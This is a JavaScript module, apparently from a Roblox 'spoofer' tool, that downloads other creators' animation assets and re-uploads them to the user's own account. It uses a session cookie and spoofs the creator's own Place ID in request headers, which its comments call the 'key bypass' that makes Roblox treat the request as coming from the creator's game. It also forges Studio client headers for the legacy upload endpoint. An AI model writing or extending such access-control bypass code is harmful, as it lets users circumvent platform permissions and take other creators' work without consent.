// ============================================
// Roblox API — Animation-focused spoof engine
// ============================================

// Asset type mapping from Roblox AssetTypeId
const ASSET_TYPES = {
  24: 'Animation', 48: 'Animation', 49: 'Animation', 50: 'Animation',
  51: 'Animation', 52: 'Animation', 53: 'Animation', 54: 'Animation',
  55: 'Animation', 56: 'Animation', 61: 'Animation',
  10: 'Model', 3: 'Audio', 13: 'Decal', 4: 'Mesh', 40: 'MeshPart',
  8: 'Hat', 41: 'HairAccessory', 42: 'FaceAccessory', 43: 'NeckAccessory',
  44: 'ShoulderAccessory', 45: 'FrontAccessory', 46: 'BackAccessory',
  47: 'WaistAccessory',
};

// Helper to clean cookie format
function getCleanCookie(rawCookie) {
  if (!rawCookie) return null;
  let clean = rawCookie.trim();
  
  if (clean.startsWith('.ROBLOSECURITY=')) {
    clean = clean.substring('.ROBLOSECURITY='.length);
  }
  
  clean = clean.replace(/^["']|["']$/g, '').trim();
  return clean;
}

// Get asset info from Roblox (type, name, creator)
export async function getAssetInfo(assetId, cookie = null) {
  const headers = { Accept: 'application/json' };
  const cleanCookie = getCleanCookie(cookie);
  
  if (cleanCookie) {
    headers['Cookie'] = `.ROBLOSECURITY=${cleanCookie}`;
  }

  // Use a common active game's Place ID to bypass info restriction if needed
  headers['Roblox-Place-Id'] = '185655149'; // Adopt Me Place ID (very active)

  const res = await fetch(`https://economy.roblox.com/v2/assets/${assetId}/details`, { headers });

  if (!res.ok) {
    const fallback = await fetch(`https://api.roblox.com/marketplace/productinfo?assetId=${assetId}`, { headers });
    if (!fallback.ok) throw new Error(`Cannot get info for asset ${assetId}`);
    const data = await fallback.json();
    return {
      id: data.AssetId,
      name: data.Name || `Asset_${assetId}`,
      assetTypeId: data.AssetTypeId,
      assetType: ASSET_TYPES[data.AssetTypeId] || 'Model',
      isAnimation: [24, 48, 49, 50, 51, 52, 53, 54, 55, 56, 61].includes(data.AssetTypeId),
      creator: data.Creator?.Name || 'Unknown',
      description: data.Description || '',
    };
  }

  const data = await res.json();
  const typeId = data.AssetTypeId || data.assetTypeId;
  return {
    id: data.AssetId || data.id || assetId,
    name: data.Name || data.name || `Asset_${assetId}`,
    assetTypeId: typeId,
    assetType: ASSET_TYPES[typeId] || 'Model',
    isAnimation: [24, 48, 49, 50, 51, 52, 53, 54, 55, 56, 61].includes(typeId),
    creator: data.Creator?.Name || 'Unknown',
    description: data.Description || '',
  };
}

// Get Roblox user profile
export async function getRobloxUser(userId) {
  const res = await fetch(`https://users.roblox.com/v1/users/${userId}`);
  if (!res.ok) throw new Error('Roblox user not found');
  return res.json();
}

// Acquire CSRF token from Roblox (needed by some endpoints)
async function getCsrfToken(cookie) {
  try {
    const res = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Length': '0',
      },
    });
    return res.headers.get('x-csrf-token') || null;
  } catch { return null; }
}

// Resolve the creator's Place ID from an asset ID
// This is the key bypass: using the creator's own Place ID as context
// makes Roblox think the request comes from the creator's game
async function resolveCreatorPlaceId(assetId, cookie) {
  const headers = { Accept: 'application/json' };
  if (cookie) headers['Cookie'] = `.ROBLOSECURITY=${cookie}`;

  try {
    // Step 1: Get creator ID from asset metadata
    const devRes = await fetch(
      `https://develop.roblox.com/v1/assets?assetIds=${assetId}`,
      { headers, signal: AbortSignal.timeout(10000) }
    );
    if (!devRes.ok) return null;
    const devData = await devRes.json();
    const creatorId = devData.data?.[0]?.creator?.targetId;
    const creatorType = devData.data?.[0]?.creator?.type; // 'User' or 'Group'
    if (!creatorId) return null;

    // Step 2: Get creator's games to find a Place ID
    let gamesUrl;
    if (creatorType === 'Group') {
      gamesUrl = `https://games.roblox.com/v2/groups/${creatorId}/games?sortOrder=Asc&limit=50`;
    } else {
      gamesUrl = `https://games.roblox.com/v2/users/${creatorId}/games?sortOrder=Asc&limit=50`;
    }

    const gamesRes = await fetch(gamesUrl, {
      headers: { Accept: 'application/json' },
      signal: AbortSignal.timeout(10000),
    });
    if (!gamesRes.ok) return null;
    const gamesData = await gamesRes.json();

    // Return the first available root place ID
    for (const game of (gamesData.data || [])) {
      const placeId = game.rootPlace?.id;
      if (placeId) return String(placeId);
    }
    return null;
  } catch {
    return null;
  }
}

// Download asset binary from Roblox — Creator Place Context Bypass
export async function downloadAsset(assetId, cookie = null) {
  const cleanCookie = getCleanCookie(cookie);

  // Get CSRF token if we have a cookie
  let csrfToken = null;
  if (cleanCookie) {
    csrfToken = await getCsrfToken(cleanCookie);
  }

  // Step 1: Resolve the creator's Place ID for context spoofing
  const creatorPlaceId = await resolveCreatorPlaceId(assetId, cleanCookie);

  // Build ordered list of Place IDs to try as context
  const placeIds = [];
  if (creatorPlaceId) placeIds.push(creatorPlaceId);
  placeIds.push('185655149'); // Adopt Me fallback

  const baseHeaders = {
    'User-Agent': 'Roblox/WinInet',
    'Requester': 'Client',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    ...(cleanCookie ? { 'Cookie': `.ROBLOSECURITY=${cleanCookie}` } : {}),
    ...(csrfToken ? { 'X-CSRF-TOKEN': csrfToken } : {}),
  };

  // Try each Place ID context
  for (const placeId of placeIds) {
    const headers = { ...baseHeaders, 'Roblox-Place-Id': placeId };

    // Attempt 1: Direct binary download with serverplaceid
    try {
      const res = await fetchWithRetry(
        `https://assetdelivery.roblox.com/v1/asset/?id=${assetId}&serverplaceid=${placeId}`,
        { headers, redirect: 'follow' },
        2
      );
      if (res.ok) {
        const buffer = Buffer.from(await res.arrayBuffer());
        if (buffer.length > 0) {
          return { buffer, size: buffer.length, contentType: res.headers.get('content-type') || 'application/octet-stream' };
        }
      }
    } catch { /* next */ }

    // Attempt 2: JSON location endpoint → follow CDN URL
    try {
      const res = await fetchWithRetry(
        `https://assetdelivery.roblox.com/v1/assetId/${assetId}`,
        { headers: { ...headers, Accept: 'application/json' }, redirect: 'follow' },
        1
      );
      if (res.ok) {
        const ct = res.headers.get('content-type') || '';
        if (ct.includes('json')) {
          const info = await res.json();
          const loc = info.location || info.Location;
          if (loc) {
            const dlRes = await fetchWithRetry(loc, { headers, redirect: 'follow' }, 2);
            if (dlRes.ok) {
              const buffer = Buffer.from(await dlRes.arrayBuffer());
              if (buffer.length > 0) return { buffer, size: buffer.length, contentType: dlRes.headers.get('content-type') || 'application/octet-stream' };
            }
          }
        } else {
          const buffer = Buffer.from(await res.arrayBuffer());
          if (buffer.length > 0) return { buffer, size: buffer.length, contentType: ct };
        }
      }
    } catch { /* next */ }

    // Attempt 3: v1/asset with placeId + expectedAssetType params
    try {
      const res = await fetchWithRetry(
        `https://assetdelivery.roblox.com/v1/asset/?id=${assetId}&placeId=${placeId}&expectedAssetType=Animation`,
        { headers, redirect: 'follow' },
        1
      );
      if (res.ok) {
        const buffer = Buffer.from(await res.arrayBuffer());
        if (buffer.length > 0) {
          return { buffer, size: buffer.length, contentType: res.headers.get('content-type') || 'application/octet-stream' };
        }
      }
    } catch { /* next */ }
  }

  throw new Error(`Failed to download asset ${assetId}: creator context bypass failed — check cookie validity`);
}

// Upload animation via legacy Roblox Studio endpoint (creates proper Animation asset type)
async function uploadAnimationLegacy(cookie, name, buffer) {
  const cleanName = name
    .replace(/[^a-zA-Z0-9 _\-]/g, '')
    .substring(0, 50)
    || `Anim_${Date.now()}`;

  const url = `https://data.roblox.com/Data/Upload.ashx?assetTypeId=24&name=${encodeURIComponent(cleanName)}&description=&ispublic=False&allowComments=False`;

  const baseHeaders = {
    'Cookie': `.ROBLOSECURITY=${cookie}`,
    'User-Agent': 'RobloxStudio/WinInet',
    'Content-Type': 'application/octet-stream',
    'Requester': 'Client',
    'Accept': '*/*',
  };

  // Step 1: POST without CSRF to trigger challenge — get token from response header
  const firstRes = await fetch(url, {
    method: 'POST',
    headers: baseHeaders,
    body: buffer,
    signal: AbortSignal.timeout(20000),
  });

  // If first attempt succeeded (unlikely but possible)
  if (firstRes.ok) {
    const text = (await firstRes.text()).trim();
    const assetId = text.match(/^\d+$/) ? text : null;
    if (assetId) return { assetId, operationId: null };
  }

  // Extract CSRF token from challenge response
  const csrf = firstRes.headers.get('x-csrf-token');
  if (!csrf) {
    const errBody = await firstRes.text().catch(() => '');
    throw new Error(`Animation upload: no CSRF token (${firstRes.status}): ${errBody.substring(0, 200)}`);
  }

  // Step 2: Retry with CSRF token
  const retryRes = await fetchWithRetry(url, {
    method: 'POST',
    headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrf },
    body: buffer,
  }, 2);

  if (retryRes.ok) {
    const text = (await retryRes.text()).trim();
    const assetId = text.match(/^\d+$/) ? text : null;
    if (assetId) return { assetId, operationId: null };
    // Some successful responses return JSON with asset ID
    try {
      const json = JSON.parse(text);
      const id = json.AssetId || json.assetId || json.id;
      if (id) return { assetId: String(id), operationId: null };
    } catch { /* not JSON */ }
    throw new Error(`Upload OK but no asset ID in response: ${text.substring(0, 200)}`);
  }

  const errBody = await retryRes.text().catch(() => '');
  throw new Error(`Animation upload failed (${retryRes.status}): ${errBody.substring(0, 200)}`);
}

// Upload asset to Roblox — animations try legacy Studio endpoint first, fallback to Open Cloud
export async function uploadAsset(apiKey, creatorId, assetType, name, description, buffer, cookie = null) {
  const cleanName = name
    .replace(/[^a-zA-Z0-9 _-]/g, '')
    .substring(0, 50)
    || `Spoofed_${Date.now()}`;

  // Try legacy animation upload first if cookie available
  if (assetType === 'Animation' && cookie) {
    try {
      const result = await uploadAnimationLegacy(cookie, name, buffer);
      return result;
    } catch (legacyErr) {
      console.warn('Legacy animation upload failed, falling back to Open Cloud:', legacyErr.message);
      // Fall through to Open Cloud
    }
  }

  // Open Cloud API upload (for non-animations or legacy fallback)
  if (!apiKey) {
    throw new Error('No API key available for Open Cloud upload');
  }

  const uploadType = assetType || 'Model';
  const metadata = JSON.stringify({
    assetType: uploadType,
    displayName: cleanName,
    description: (description || `Uploaded: ${cleanName}`).substring(0, 1000),
    creationContext: {
      creator: { userId: String(creatorId) },
    },
  });

  const fileContentType = (uploadType === 'Model' || uploadType === 'Animation') ? 'model/x-rbxm' : 'application/octet-stream';
  const boundary = '----BMKSpoofer' + Date.now() + Math.random().toString(36).substr(2);

  const parts = [];
  parts.push(`--${boundary}\r\n`);
  parts.push(`Content-Disposition: form-data; name="request"\r\n`);
  parts.push(`Content-Type: application/json\r\n\r\n`);
  parts.push(metadata + '\r\n');
  parts.push(`--${boundary}\r\n`);
  parts.push(`Content-Disposition: form-data; name="fileContent"; filename="${cleanName}.rbxm"\r\n`);
  parts.push(`Content-Type: ${fileContentType}\r\n\r\n`);

  const bodyStart = Buffer.from(parts.join(''));
  const bodyEnd = Buffer.from(`\r\n--${boundary}--\r\n`);
  const bodyBuffer = Buffer.concat([bodyStart, buffer, bodyEnd]);

  const res = await fetchWithRetry('https://apis.roblox.com/assets/v1/assets', {
    method: 'POST',
    headers: {
      'x-api-key': apiKey,
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Content-Length': String(bodyBuffer.length),
    },
    body: bodyBuffer,
  });

  const responseText = await res.text();

  if (!res.ok) {
    let errorMsg = `Upload failed (${res.status})`;
    try {
      const errData = JSON.parse(responseText);
      errorMsg = errData.message || errData.error || errData.Message || responseText;
    } catch {
      errorMsg = responseText || errorMsg;
    }
  }

  let data;
  try {
    data = JSON.parse(responseText);
    console.log('Open Cloud API Response:', JSON.stringify(data, null, 2));
  } catch {
    throw new Error(`Invalid response from upload: ${responseText.substring(0, 200)}`);
  }

  // Extract asset ID atau operation ID
  let assetId = data.assetId || data.response?.assetId || data.id;
  const operationId = data.operationId || data.path;

  // Jika async operation (done=false), poll sampai complete
  if (!assetId && operationId && !data.done) {
    console.log('Async operation, polling:', operationId);
    const startTime = Date.now();
    const maxWait = 30000;

    while (Date.now() - startTime < maxWait) {
      await sleep(1000);
      try {
        const status = await checkOperation(apiKey, operationId);
        if (status?.done) {
          assetId = status.assetId;
          console.log('Operation done, assetId:', assetId);
          break;
        }
      } catch (e) {
        console.warn('Poll error:', e.message);
      }
    }
  }

  if (!assetId) {
    throw new Error(`No asset ID: ${JSON.stringify(data)}`);
  }

  return { assetId: String(assetId), operationId, raw: data };
}





// Check operation status (upload might be async)
export async function checkOperation(apiKey, operationId) {
  if (!operationId) return null;

  const path = operationId.startsWith('operations/') ? operationId : `operations/${operationId}`;
  const res = await fetch(`https://apis.roblox.com/assets/v1/${path}`, {
    headers: { 'x-api-key': apiKey },
  });

  if (!res.ok) return null;
  const data = await res.json();

  return {
    done: data.done || false,
    assetId: data.response?.assetId || null,
    error: data.error?.message || null,
  };
}

// Fetch with retry (exponential backoff)
async function fetchWithRetry(url, options = {}, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(url, {
        ...options,
        signal: AbortSignal.timeout(30000), // 30s timeout
      });

      if (res.status === 429) {
        const retryAfter = parseInt(res.headers.get('retry-after') || '2');
        await sleep(retryAfter * 1000);
        continue;
      }

      return res;
    } catch (err) {
      if (i === retries - 1) throw err;
      await sleep(Math.pow(2, i) * 1000); // 1s, 2s, 4s
    }
  }
  throw new Error('Max retries exceeded');
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Parse asset input (LUA table or raw IDs)
export function parseAssetInput(input) {
  const lines = input.trim().split('\n').filter(l => l.trim());
  const assets = [];

  for (const line of lines) {
    const cleanLine = line.trim();
    const luaMatch = cleanLine.match(/\{\s*"([^"]+)"\s*,\s*(\d+)\s*\}/);
    if (luaMatch) {
      assets.push({ name: luaMatch[1], id: luaMatch[2], originalLine: cleanLine });
      continue;
    }

    const idMatch = cleanLine.match(/^(\d{5,})$/);
    if (idMatch) {
      assets.push({ name: `Asset_${idMatch[1]}`, id: idMatch[1], originalLine: cleanLine });
      continue;
    }

    const csvMatch = cleanLine.match(/^["']?([^,"']+)["']?\s*,\s*(\d+)/);
    if (csvMatch) {
      assets.push({ name: csvMatch[1].trim(), id: csvMatch[2], originalLine: cleanLine });
      continue;
    }

    const urlMatch = cleanLine.match(/(\d{8,})/);
    if (urlMatch) {
      assets.push({ name: `Asset_${urlMatch[1]}`, id: urlMatch[1], originalLine: cleanLine });
    }
  }

  return assets;
}
